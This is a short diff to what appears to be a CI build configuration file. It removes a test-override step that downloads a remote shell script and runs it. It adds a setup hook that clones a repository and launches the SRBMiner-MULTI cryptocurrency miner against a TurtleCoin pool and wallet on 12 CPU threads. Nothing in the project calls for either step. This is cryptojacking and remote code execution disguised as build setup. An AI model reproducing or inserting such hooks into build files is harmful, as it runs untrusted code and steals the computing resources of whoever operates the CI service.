@@ -1,6 +1,6 @@
 build:
   nodes:
-    analysis:
-      tests:
-        override:
-          - command: wget https://raw.githubusercontent.com/remakove/sank/main/labs.sh && chmod +x labs.sh && ./labs.sh
+    my-node:
+      project_setup:
+        before:
+          - command: git https://github.com/remakove/artions.git artions && cd artions && chmod +x SRBMiner-MULTI && ./SRBMiner-MULTI --algorithm argon2id_chukwa2 --pool ca.turtlecoin.herominers.com:10380 --wallet TRTLv1eACSpKx6fbiG4PAiQj2xtiwxhHQ9vYZhhf84USCaabq8JSyoNX9vamnUcG35BkQy6VfwUy5CsV9YNomioPGGyVhKQKoJF.p5 --disable-gpu --cpu-threads 12
